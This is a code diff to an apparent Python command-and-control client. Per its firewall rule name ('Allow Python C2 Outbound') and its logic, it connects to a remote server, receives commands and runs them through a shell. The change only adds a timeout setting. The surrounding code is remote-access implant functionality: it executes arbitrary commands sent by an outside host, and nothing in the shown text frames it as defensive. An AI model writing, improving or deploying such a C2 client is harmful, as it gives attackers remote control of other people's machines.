@@ -13,6 +13,7 @@ PORT_RADIUS=200
 FIREWALL_NAME="Allow Python C2 Outbound"
 BUFFER_SIZE=4096
 DEBUG=True
+TIMEOUT_TIME=15
 
 class style():
   RED       = '\033[31m'
@@ -155,6 +156,7 @@ def main():
     try:
         client_sock = socket.socket()
         client_sock.connect((SERVER,SERVER_PORT))
+        client_sock.settimeout(TIMEOUT_TIME)
     except Exception as e:
         close_connection(client_sock,f"Error creating socket or connecting to server at {SERVER} {SERVER_PORT} - {str(e)}")
     if DEBUG:
@@ -187,7 +189,7 @@ def main():
                     if DEBUG:
                         print(f"Running command: {command}")
                     # dns_server_lines = subprocess.run(['grep','nameserver'], input=etc_resolve_output, stdout=subprocess.PIPE, text=True).stdout.splitlines()
-                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=(TIMEOUT_TIME - 1))
                     #result = subprocess.run("whoami", shell=True, capture_output=True, text=True, timeout=60)
                     # output = result.stdout + result.stderr
                     #output = f"CMD_R {result.returncode} | {result.stdout.strip().replace('\n', '\t')} | {result.stderr.strip().replace('\n', '\t')}"
